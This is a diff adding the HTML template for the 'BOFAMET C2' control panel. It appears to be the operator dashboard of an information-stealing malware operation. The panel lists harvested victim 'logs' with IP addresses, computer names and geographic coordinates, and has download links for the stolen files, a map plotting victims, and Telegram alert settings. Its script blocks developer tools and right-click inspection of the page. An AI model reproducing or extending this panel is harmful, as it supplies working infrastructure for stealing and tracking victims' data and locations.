@@ -1,0 +1,1259 @@
+<!DOCTYPE html>
+<html lang="ru" id="html-lang">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOFAMET Control Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+    <link rel="icon" href="{{ url_for('static', path='/favicon.ico') }}">
+    <style>
+        :root {
+            --bg-primary: #121212;
+            --bg-secondary: #1e1e1e;
+            --bg-tertiary: #252525;
+            --text-primary: #e0e0e0;
+            --text-secondary: #a0a0a0;
+            --accent-primary: #2962ff;
+            --accent-secondary: #304ffe;
+            --accent-gradient: linear-gradient(135deg, #2962ff, #304ffe);
+            --border-color: #333333;
+            --success: #00c853;
+            --warning: #ffab00;
+            --danger: #ff1744;
+            --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --glow: 0 0 15px rgba(41, 98, 255, 0.3);
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f8f9fa;
+            --bg-secondary: #ffffff;
+            --bg-tertiary: #f1f3f5;
+            --text-primary: #212529;
+            --text-secondary: #495057;
+            --accent-primary: #2962ff;
+            --accent-secondary: #304ffe;
+            --accent-gradient: linear-gradient(135deg, #2962ff, #304ffe);
+            --border-color: #dee2e6;
+            --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --glow: 0 0 15px rgba(41, 98, 255, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: var(--transition);
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 1.5rem;
+            flex: 1;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--accent-primary);
+            transition: var(--transition);
+            cursor: pointer;
+        }
+
+        .logo:hover {
+            filter: brightness(1.15);
+            transform: translateY(-1px);
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--accent-gradient);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 1.25rem;
+            box-shadow: var(--glow);
+            transition: var(--transition);
+        }
+
+        .logo:hover .logo-icon {
+            transform: rotate(10deg) scale(1.05);
+        }
+
+        .controls {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .server-info-display {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 0.75rem;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            margin-left: auto;
+            padding-right: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .info-block {
+            display: flex;
+            gap: 0.25rem;
+            align-items: center;
+            white-space: nowrap;
+        }
+
+        .separator {
+            color: var(--text-secondary);
+            opacity: 0.5;
+        }
+
+        .server-info-display .info-label {
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+        .server-info-display .info-value {
+            color: var(--accent-primary);
+        }
+
+        .theme-toggle {
+            background: none;
+            border: none;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-primary);
+            transition: var(--transition);
+            background: var(--bg-tertiary);
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-secondary);
+            box-shadow: var(--glow);
+            transform: rotate(15deg);
+        }
+
+        .logout-btn {
+            background: var(--accent-gradient);
+            border: none;
+            border-radius: 8px;
+            padding: 0.5rem 1.25rem;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: var(--glow);
+        }
+
+        .logout-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(41, 98, 255, 0.3);
+        }
+
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.5rem;
+        }
+
+        .tab-btn {
+            background: none;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+            font-size: 1rem;
+            color: var(--text-secondary);
+            cursor: pointer;
+            border-radius: 8px 8px 0 0;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .tab-btn.active {
+            color: var(--accent-primary);
+        }
+
+        .tab-btn.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--accent-primary);
+            border-radius: 3px 3px 0 0;
+        }
+
+        .tab-btn:hover:not(.active) {
+            background: var(--bg-tertiary);
+        }
+
+        .tab-content {
+            display: none;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .log-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .log-card {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: var(--card-shadow);
+            transition: var(--transition);
+            border: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.5s ease forwards;
+            animation-delay: calc(0.05s * var(--i));
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .log-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15), var(--glow);
+            border-color: var(--accent-primary);
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .log-id {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .log-time {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .log-details {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .detail-row {
+            display: flex;
+        }
+
+        .detail-label {
+            flex: 0 0 140px;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .detail-value {
+            flex: 1;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            word-break: break-word;
+        }
+
+        .download-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+            padding: 0.25rem 0;
+        }
+
+        .download-link:hover {
+            color: var(--accent-secondary);
+        }
+
+        .download-link::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent-primary);
+            transition: var(--transition);
+        }
+
+        .download-link:hover::after {
+            width: 100%;
+        }
+
+        .system-info {
+            background: var(--bg-tertiary);
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+            margin-top: 0.5rem;
+        }
+
+        .empty-state {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 4rem 2rem;
+            color: var(--text-secondary);
+            opacity: 0;
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        .empty-state-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            opacity: 0.5;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(0.95); }
+        }
+
+        .map-container {
+            height: 600px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: var(--card-shadow);
+            border: 1px solid var(--border-color);
+            opacity: 0;
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .footer {
+            text-align: center;
+            padding: 1.5rem;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            border-top: 1px solid var(--border-color);
+            margin-top: 2rem;
+        }
+
+        .footer a {
+            color: var(--accent-primary);
+            text-decoration: none;
+            position: relative;
+            font-weight: 600;
+        }
+
+        .footer a::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent-primary);
+            transition: var(--transition);
+        }
+
+        .footer a:hover::after {
+            width: 100%;
+        }
+
+        @media (max-width: 768px) {
+            .log-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 1rem;
+            }
+            
+            .controls {
+                width: 100%;
+                justify-content: space-between;
+            }
+            
+            .tabs {
+                overflow-x: auto;
+                padding-bottom: 0;
+            }
+            
+            .map-container {
+                height: 400px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .tab-btn {
+                padding: 0.75rem 1rem;
+                font-size: 0.9rem;
+            }
+            
+            .detail-row {
+                flex-direction: column;
+                gap: 0.25rem;
+            }
+            
+            .detail-label {
+                flex: 0 0 auto;
+            }
+            
+            .map-container {
+                height: 300px;
+            }
+        }
+
+        .control-buttons {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .control-btn {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0.75rem 1.5rem;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .control-btn:hover {
+            background: var(--bg-secondary);
+            border-color: var(--accent-primary);
+            transform: translateY(-2px);
+        }
+
+        .control-btn.primary {
+            background: var(--accent-gradient);
+            color: white;
+            border: none;
+            box-shadow: var(--glow);
+        }
+
+        .control-btn.primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(41, 98, 255, 0.3);
+        }
+
+        .control-btn.danger {
+            background: #ff1744; 
+            color: white;
+            border: none;
+            box-shadow: 0 0 15px rgba(255, 23, 68, 0.3);
+        }
+        
+        .control-btn.danger:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 23, 68, 0.3);
+        }
+
+        .log-count-display {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0.75rem 1.5rem;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .log-count-display span:last-child {
+            color: var(--accent-primary);
+            font-size: 1.1em;
+        }
+
+        @keyframes logoClick {
+            0% { transform: scale(1); }
+            50% { transform: scale(0.9); }
+            100% { transform: scale(1); }
+        }
+
+        .lang-toggle {
+            background: var(--bg-tertiary);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: var(--text-primary);
+        }
+
+        .lang-toggle:hover {
+            background: var(--bg-secondary);
+            box-shadow: var(--glow);
+            transform: scale(1.1);
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            transition: var(--transition);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background: var(--input-bg);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            transition: var(--transition);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px rgba(41, 98, 255, 0.2);
+            transform: translateY(-1px);
+        }
+
+        .save-settings-button {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            border: none;
+            border-radius: 8px;
+            background: var(--accent-gradient);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: var(--glow);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .save-settings-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(41, 98, 255, 0.3);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1.5rem;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-radius: 5px;
+            background-color: var(--input-bg);
+            cursor: pointer;
+            outline: none;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked {
+            background-color: var(--accent-primary);
+            border-color: var(--accent-primary);
+        }
+
+        .checkbox-group input[type="checkbox"]:checked::before {
+            content: '\2713';
+            display: block;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 14px;
+            color: white;
+        }
+
+        .checkbox-group label {
+            margin-bottom: 0;
+            cursor: pointer;
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo" id="logo">
+                <div class="logo-icon">B</div>
+                <span>BOFAMET C2</span>
+            </div>
+            <div class="server-info-display">
+                <span class="info-block">
+                    <span class="lang-text info-label" data-ru="IP Сервера:" data-en="Server IP:">IP Сервера:</span>
+                    <span id="serverIp" class="info-value">Загрузка...</span>
+                </span>
+                <span class="separator">|</span>
+                <span class="info-block">
+                    <span class="lang-text info-label" data-ru="Порт:" data-en="Port:">Порт:</span>
+                    <span id="serverPort" class="info-value">Загрузка...</span>
+                </span>
+                <span class="separator">|</span>
+                <span class="info-block">
+                    <span class="lang-text info-label" data-ru="Пинг:" data-en="Ping:">Пинг:</span>
+                    <span id="serverPing" class="info-value">Загрузка...</span>
+                </span>
+            </div>
+            <div class="controls">
+                <button class="lang-toggle" id="langToggle" title="Switch language">EN</button>
+                <button class="theme-toggle" id="themeToggle">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12,22 C17.5228475,22 22,17.5228475 22,12 C22,6.4771525 17.5228475,2 12,2 C6.4771525,2 2,6.4771525 2,12 C2,17.5228475 6.4771525,22 12,22 Z M12,20 L12,4 C16.418278,4 20,7.581722 20,12 C20,16.418278 16.418278,20 12,20 Z"/>
+                    </svg>
+                </button>
+                <button class="logout-btn" onclick="location.href='/logout'">
+                    <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M14.08,15.59L16.67,13H7V11H16.67L14.08,8.41L15.5,7L20.5,12L15.5,17L14.08,15.59M19,3A2,2 0 0,1 21,5V19A2,2 0 0,1 19,21H5A2,2 0 0,1 3,19V5A2,2 0 0,1 5,3H19Z"/>
+                    </svg>
+                    <span class="lang-text" data-ru="Выйти" data-en="Logout">Выйти</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="logs-tab">
+                <span class="lang-text" data-ru="Логи" data-en="Logs">Логи</span>
+            </button>
+            <button class="tab-btn" data-tab="map-tab">
+                <span class="lang-text" data-ru="Геолокация" data-en="Geolocation">Геолокация</span>
+            </button>
+            <button class="tab-btn" data-tab="server-logs-tab">
+                <span class="lang-text" data-ru="Логи Сервера" data-en="Server Logs">Логи Сервера</span>
+            </button>
+            <button class="tab-btn" data-tab="telegram-settings-tab">
+                <span class="lang-text" data-ru="Уведомления Telegram" data-en="Telegram Notifications">Уведомления Telegram</span>
+            </button>
+        </div>
+
+        <div id="logs-tab" class="tab-content active">
+            <div class="control-buttons">
+                <button class="control-btn" onclick="location.href='/'">
+                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M17.65,6.35C16.2,4.9 14.21,4 12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20C15.73,20 18.84,17.45 19.73,14H17.65C16.83,16.33 14.61,18 12,18A6,6 0 0,1 6,12A6,6 0 0,1 12,6C13.66,6 15.14,6.69 16.22,7.78L13,11H20V4L17.65,6.35Z"/>
+                    </svg>
+                    <span class="lang-text" data-ru="Обновить" data-en="Refresh">Обновить</span>
+                </button>
+                <button class="control-btn primary" onclick="location.href='/download_all_logs'">
+                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/>
+                    </svg>
+                    <span class="lang-text" data-ru="Скачать все логи" data-en="Download all logs">Скачать все логи</span>
+                </button>
+                <div class="log-count-display">
+                    <span class="lang-text" data-ru="Всего логов:" data-en="Total logs:">Всего логов:</span> <span id="logCount">{{ log_count }}</span>
+                </div>
+            </div>
+            <div class="log-grid">
+                {% if logs %}
+                    {% for log in logs %}
+                    <div class="log-card" data-log-id="{{ log.id }}" data-log-folder-name="{{ log.log_folder_name }}" style="--i: {{ loop.index0 }};">
+                        <div class="log-header">
+                            <div class="log-id">ID: {{ log.id }}</div>
+                            <div class="log-time">{{ log.timestamp }}</div>
+                        </div>
+                        <div class="log-details">
+                            <div class="detail-row">
+                                <div class="detail-label lang-text" data-ru="IP Клиента:" data-en="Client IP:">IP Клиента:</div>
+                                <div class="detail-value">{{ log.ip_address }}</div>
+                            </div>
+                            <div class="detail-row">
+                                <div class="detail-label lang-text" data-ru="Имя Компьютера:" data-en="Computer Name:">Имя Компьютера:</div>
+                                <div class="detail-value">{{ log.computer_name }}</div>
+                            </div>
+                            <div class="detail-row">
+                                <div class="detail-label lang-text" data-ru="Публичный IP:" data-en="Public IP:">Публичный IP:</div>
+                                <div class="detail-value">{{ log.public_ip }}</div>
+                            </div>
+                            <div class="detail-row">
+                                <div class="detail-label lang-text" data-ru="Координаты:" data-en="Coordinates:">Координаты:</div>
+                                <div class="detail-value">{{ log.latitude|round(4) }}, {{ log.longitude|round(4) }}</div>
+                            </div>
+                            <div class="detail-row">
+                                <div class="detail-label lang-text" data-ru="Файл:" data-en="File:">Файл:</div>
+                                <div class="detail-value">
+                                    <a href="{{ log.download_url }}" class="download-link">
+                                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                            <path d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/>
+                                        </svg>
+                                        {{ log.file_name_display }}
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="control-btn danger delete-log-btn" data-log-id="{{ log.id }}" data-log-folder-name="{{ log.log_folder_name }}">
+                            <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M19,4H15.5L14.5,3H9.5L8.5,4H5V6H19M4,21V6H20V21A1,1 0 0,1 19,22H5A1,1 0 0,1 4,21Z"/>
+                            </svg>
+                            <span class="lang-text" data-ru="Удалить" data-en="Delete">Удалить</span>
+                        </button>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div class="empty-state">
+                        <div class="empty-state-icon">
+                            <svg width="64" height="64" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M20,12A8,8 0 0,0 12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12M22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2A10,10 0 0,1 22,12M10,9.5C10,10.3 9.3,11 8.5,11C7.7,11 7,10.3 7,9.5C7,8.7 7.7,8 8.5,8C9.3,8 10,8.7 10,9.5M17,9.5C17,10.3 16.3,11 15.5,11C14.7,11 14,10.3 14,9.5C14,8.7 14.7,8 15.5,8C16.3,8 17,8.7 17,9.5M12,17.23C10.25,17.23 8.71,16.5 7.81,15.42L9.23,14C9.68,14.72 10.75,15.23 12,15.23C13.25,15.23 14.32,14.72 14.77,14L16.19,15.42C15.29,16.5 13.75,17.23 12,17.23Z"/>
+                            </svg>
+                        </div>
+                        <h3 class="lang-text" data-ru="Нет данных для отображения" data-en="No data to display">Нет данных для отображения</h3>
+                        <p class="lang-text" data-ru="BOFAMET ожидает новые подключения" data-en="BOFAMET waiting for new connections">BOFAMET ожидает новые подключения</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+
+        <div id="map-tab" class="tab-content">
+            <div class="map-container" id="mapid"></div>
+        </div>
+
+        <div id="server-logs-tab" class="tab-content">
+            <div class="control-buttons">
+                <button class="control-btn" id="refreshServerLogsBtn">
+                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M17.65,6.35C16.2,4.9 14.21,4 12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20C15.73,20 18.84,17.45 19.73,14H17.65C16.83,16.33 14.61,18 12,18A6,6 0 0,1 6,12A6,6 0 0,1 12,6C13.66,6 15.14,6.69 16.22,7.78L13,11H20V4L17.65,6.35Z"/>
+                    </svg>
+                    <span class="lang-text" data-ru="Обновить логи" data-en="Refresh Logs">Обновить логи</span>
+                </button>
+            </div>
+            <pre id="server-log-display"></pre>
+        </div>
+
+        <div id="telegram-settings-tab" class="tab-content">
+            <div class="form-group">
+                <label for="telegramBotToken" class="form-label lang-text" data-ru="Токен Telegram бота:" data-en="Telegram Bot Token:">Токен Telegram бота:</label>
+                <input type="text" id="telegramBotToken" class="form-input" placeholder="Введите токен вашего Telegram бота" data-ru="Введите токен вашего Telegram бота" data-en="Enter your Telegram bot token">
+            </div>
+            <div class="form-group">
+                <label for="telegramChatId" class="form-label lang-text" data-ru="ID чата Telegram:" data-en="Telegram Chat ID:">ID чата Telegram:</label>
+                <input type="text" id="telegramChatId" class="form-input" placeholder="Введите ID чата или канала" data-ru="Введите ID чата или канала" data-en="Enter chat or channel ID">
+            </div>
+            <div class="form-group checkbox-group">
+                <input type="checkbox" id="enableTelegramNotifications">
+                <label for="enableTelegramNotifications" class="form-label lang-text" data-ru="Включить уведомления" data-en="Enable Notifications">Включить уведомления</label>
+            </div>
+            <button class="save-settings-button" id="saveTelegramSettingsBtn">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M9.8,17.43L4.43,12.06L5.84,10.65L9.8,14.61L18.19,6.22L19.6,7.63L9.8,17.43Z"/>
+                </svg>
+                <span class="lang-text" data-ru="Сохранить настройки" data-en="Save Settings">Сохранить настройки</span>
+            </button>
+            <p class="lang-text" data-ru="Нажмите 'Сохранить настройки', чтобы применить изменения." data-en="Click 'Save Settings' to apply changes."></p>
+        </div>
+
+
+    </div>
+
+    <div class="footer">
+        <span class="lang-text" data-ru="Powered by BOFAMET. Created by" data-en="Powered by BOFAMET. Created by">Powered by BOFAMET. Created by</span> 
+        <a href="https://t.me/BIOzolman" target="_blank">Zolman</a>.
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        const themeToggle = document.getElementById('themeToggle');
+        const currentTheme = localStorage.getItem('theme') || 'dark';
+        
+        document.documentElement.setAttribute('data-theme', currentTheme);
+        
+        themeToggle.addEventListener('click', () => {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            
+            document.documentElement.setAttribute('data-theme', newTheme);
+            localStorage.setItem('theme', newTheme);
+            
+            themeToggle.style.transform = 'rotate(180deg)';
+            setTimeout(() => {
+                themeToggle.style.transform = 'rotate(0)';
+            }, 300);
+        });
+
+        const langToggle = document.getElementById('langToggle');
+        let currentLang = localStorage.getItem('lang') || 'ru';
+        
+        function updateLanguage() {
+            document.getElementById('html-lang').setAttribute('lang', currentLang);
+            
+            langToggle.textContent = currentLang === 'ru' ? 'EN' : 'RU';
+            
+            document.querySelectorAll('.lang-text').forEach(el => {
+                el.textContent = el.getAttribute(`data-${currentLang}`);
+            });
+            
+            localStorage.setItem('lang', currentLang);
+        }
+        
+        langToggle.addEventListener('click', () => {
+            currentLang = currentLang === 'ru' ? 'en' : 'ru';
+            updateLanguage();
+        });
+        
+        updateLanguage();
+
+        const tabButtons = document.querySelectorAll('.tab-btn');
+        const tabContents = document.querySelectorAll('.tab-content');
+        
+        tabButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                tabButtons.forEach(btn => btn.classList.remove('active'));
+                tabContents.forEach(content => content.classList.remove('active'));
+                
+                button.classList.add('active');
+                
+                const tabId = button.getAttribute('data-tab');
+                const tabContent = document.getElementById(tabId);
+                tabContent.classList.add('active');
+                
+                if (tabId === 'map-tab' && !window.mapInitialized) {
+                    initMap();
+                    window.mapInitialized = true;
+                }
+            });
+        });
+
+        let map;
+        function initMap() {
+            map = L.map('mapid').setView([20, 0], 2);
+            
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors',
+                className: 'map-tiles'
+            }).addTo(map);
+            
+            loadLocationData();
+        }
+        
+        async function loadLocationData() {
+            try {
+                const response = await fetch('/api/locations');
+                if (!response.ok) throw new Error('Ошибка загрузки данных');
+                
+                const locations = await response.json();
+                locations.forEach(loc => {
+                    if (loc.latitude !== 0 && loc.longitude !== 0) {
+                        const marker = L.marker([loc.latitude, loc.longitude])
+                            .addTo(map)
+                            .bindPopup(`
+                                <b>${loc.computer_name}</b><br>
+                                IP: ${loc.public_ip}<br>
+                                ${loc.timestamp}
+                            `);
+                        
+                        setTimeout(() => {
+                            marker.setOpacity(1);
+                        }, 300);
+                    }
+                });
+                
+                if (locations.length > 0) {
+                    const group = new L.featureGroup(locations.map(loc => 
+                        L.marker([loc.latitude, loc.longitude])
+                    ));
+                    map.fitBounds(group.getBounds().pad(0.1));
+                }
+            } catch (error) {
+                console.error('Ошибка при загрузке данных карты:', error);
+            }
+        }
+        
+        window.addEventListener('resize', () => {
+            if (map) {
+                setTimeout(() => map.invalidateSize(), 300);
+            }
+        });
+        
+        const logo = document.getElementById('logo');
+        logo.addEventListener('click', function() {
+            this.style.animation = 'logoClick 0.3s ease';
+            setTimeout(() => {
+                this.style.animation = '';
+            }, 300);
+            
+            setTimeout(() => {
+                location.reload();
+            }, 200);
+        });
+
+        (function() {
+            function disable_f_keys() {
+                document.onkeydown = function(e) {
+                    if (e.keyCode == 123) {
+                        return false;
+                    }
+                    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+                        return false;
+                    }
+                    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+                        return false;
+                    }
+                    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+                        return false;
+                    }
+                    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+                        return false;
+                    }
+                };
+            }
+
+            function prevent_dev_tools() {
+                setInterval(function() {
+                    if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
+                        document.body.innerHTML = "<h1>Access Denied!</h1><p>Developer tools are not allowed.</p>";
+                        window.stop();
+                    }
+                }, 1000);
+            }
+
+            disable_f_keys();
+            prevent_dev_tools();
+
+            document.addEventListener('contextmenu', event => event.preventDefault());
+        })();
+
+        let serverLogsInterval;
+        const serverLogsTabButton = document.querySelector('[data-tab="server-logs-tab"]');
+        const serverLogDisplay = document.getElementById('server-log-display');
+
+        async function fetchServerLogs() {
+            try {
+                const response = await fetch('/api/server_logs_data');
+                if (!response.ok) throw new Error('Failed to fetch server logs');
+                const data = await response.json();
+                serverLogDisplay.textContent = data.log_content;
+                serverLogDisplay.scrollTop = serverLogDisplay.scrollHeight;
+            } catch (error) {
+                console.error('Error fetching server logs:', error);
+                serverLogDisplay.textContent = `Error loading logs: ${error.message}`;
+            }
+        }
+
+        serverLogsTabButton.addEventListener('click', () => {
+            clearInterval(serverLogsInterval);
+            fetchServerLogs();
+            serverLogsInterval = setInterval(fetchServerLogs, 8000);
+        });
+
+        tabButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const tabId = button.getAttribute('data-tab');
+                if (tabId !== 'server-logs-tab') {
+                    clearInterval(serverLogsInterval);
+                }
+            });
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const activeTab = document.querySelector('.tab-btn.active');
+            if (activeTab && activeTab.getAttribute('data-tab') === 'server-logs-tab') {
+                fetchServerLogs();
+                serverLogsInterval = setInterval(fetchServerLogs, 8000);
+            }
+        });
+
+        document.getElementById('refreshServerLogsBtn').addEventListener('click', fetchServerLogs);
+
+        const logCountSpan = document.getElementById('logCount');
+
